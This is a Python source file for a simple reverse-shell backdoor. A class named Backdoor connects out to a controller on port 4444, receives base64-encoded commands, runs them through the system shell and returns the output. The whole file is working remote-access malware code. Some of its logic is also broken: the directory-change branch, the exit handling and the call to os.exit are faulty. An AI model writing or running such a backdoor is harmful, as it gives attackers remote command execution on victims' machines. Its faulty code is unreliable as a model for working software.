import socket, subprocess, os
import json
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket. socket(socket.AF_INET, socket. SOCK_STREAM)
        self.connection.connect((ip, port))

    def exec_command(self, command):
        return subprocess.getoutput(command)


    def ser_send(self,data):
        json_data = base64.b64encode(data)
        self.connection.send(json_data)

    def recive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(32768).decode("utf-8")
                json_data = base64.b64decode(json_data)
                return json_data.decode("utf-8")
            except ValueError:
                continue



    def change_dir(self,path):
        os.chdir(path)
        return "[+] Cambiado a " + path


    def run(self):
        while True:
            command = self.recive()
            print("command: " + command)
            if command == "exit":
                self.connection.close()
            elif command == "cd" and len(command) > 1:
                
                result = self.change_dir(command[1])
                self.ser_send(result.encode("utf-8"))
            else:
                result = self.exec_command(command)
                self.ser_send(result.encode("utf-8"))

        self.connection.close()
        os.exit()


puert = Backdoor("localhost", 4444)
puert.run()
